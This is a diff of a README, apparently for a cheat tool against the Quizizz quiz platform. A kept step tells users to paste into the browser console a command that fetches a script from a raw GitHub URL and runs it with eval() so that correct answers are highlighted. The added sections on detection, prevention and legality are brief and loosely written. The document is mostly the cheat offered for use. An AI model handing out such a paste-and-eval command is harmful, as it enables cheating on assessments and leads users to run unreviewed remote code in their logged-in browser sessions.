@@ -13,3 +13,26 @@ fetch("https://raw.githubusercontent.com/acimovicuwu/nijeNistaSumnjivo/master/di
 .then((t) => eval(t)))
 ```
 3. You can now close the console. The good answers should be highlighted by background opacity.
+
+## HOW TO DETECT
+
+Currently there is no way...
+
+## HOW TO PREVENT
+
+Prevent this exploit by marking wrong answers and than marking it by hand.
+
+## WHEN WILL WE HAVE A PATCH
+
+Soon(is) i expect around March
+
+## IS THIS ILIGAL
+
+If you are student you can get in truble.
+
+## HOW TO SPREAD AN ISSUE
+
+Email quizzies at: support@quizizz.com
+With your conserns.
+
+
